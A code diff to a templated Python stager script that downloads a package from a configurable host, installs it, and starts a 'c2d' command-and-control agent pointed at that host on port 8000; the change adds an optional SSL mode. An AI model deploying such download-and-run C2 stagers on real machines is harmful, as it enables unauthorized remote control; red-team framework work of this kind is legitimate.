@@ -14,12 +14,19 @@ if __name__ == "__main__":
         print e
 
     os.chdir('agent')
-    url = "http://{{hostname}}/latest"
+    if {{ ssl }}:
+        url = "https://{{hostname}}/latest"
+    else:
+        url = "http://{{hostname}}/latest"
+
     filename = re.findall("filename=(.+)", urllib.urlopen(url).info().getheader("Content-Disposition"))[0]
     whl = urllib.urlretrieve(url, filename)
     install(filename)
     print '[+] Install succesfull, configuring host'
     host = '{{hostname}}'.split(':')[0]
-    subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000'])
+    if {{ ssl }}:
+        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000', '--ssl'])
+    else:
+        subprocess.call(['c2d', '--c2-host', host, '--c2-port', '8000'])
 
 
